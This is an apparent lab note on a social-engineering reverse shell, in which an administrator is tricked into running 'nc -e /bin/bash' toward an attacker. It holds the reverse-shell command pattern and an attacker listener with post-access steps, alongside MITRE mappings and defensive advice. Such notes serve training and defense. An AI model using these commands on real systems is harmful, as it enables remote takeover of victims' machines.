# Admin `nc` to infected server? Reverse shell — his PC gone.

## Idea

Admin runs **netcat toward your box** (fake „support line”). If they use **`nc -e /bin/bash host port`** (or a script that does the same), the **shell runs on their machine** but the **TCP session terminates on you** → classic **reverse shell** / **RCE**.

This is **not** magic on the server side: the **client** must execute `-e` or a bash `/dev/tcp` one-liner.

## MITRE

| ID | Note |
|----|------|
| T1219 | Remote access tooling (netcat) |
| T1059.004 | Unix shell over TCP |

## Attacker (infected Kali)

```bash
nc -lvnp 9999
# whoami → admin (their user)
# cat /home/admin/FLAG.txt
```

## Lab

`~/Desktop/htb/ttp-nc-lab/` — Docker `admin-nc-client`, listener on `172.17.0.1:9999`.

## vs SSH scenario

| | SSH key / agent | Netcat `-e` |
|--|-----------------|-------------|
| Who runs payload | Often server-side pivot | **Client** attaches shell |
| Typical mistake | `ssh -A` | Trusting IT one-liner with `nc -e` |

## Defense

- Block egress `nc` / unknown outbound shells.
- Never run `nc -e` from runbooks; use VPN + real support tools.
- EDR on outbound bash + unusual TCP to unknown IPs.